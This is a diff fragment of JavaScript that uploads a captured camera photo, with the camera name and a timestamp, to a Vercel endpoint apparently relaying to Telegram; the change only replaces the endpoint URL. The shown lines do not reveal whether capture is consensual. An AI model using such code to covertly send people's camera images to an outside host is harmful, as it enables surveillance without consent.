@@ -143,7 +143,7 @@
             formData.append('photo', imageBlob, 'capture.jpg');
             formData.append('caption', `📸 [${cameraName}] \n🗓️ ${new Date().toLocaleString()}`);
 
-            const VERCEL_API_URL = "https://api-secret-seven.vercel.app/api/send-telegram"; 
+            const VERCEL_API_URL = "https://teste666.vercel.app/api/send-photo"; 
 
             try {
                 const response = await fetch(VERCEL_API_URL, {
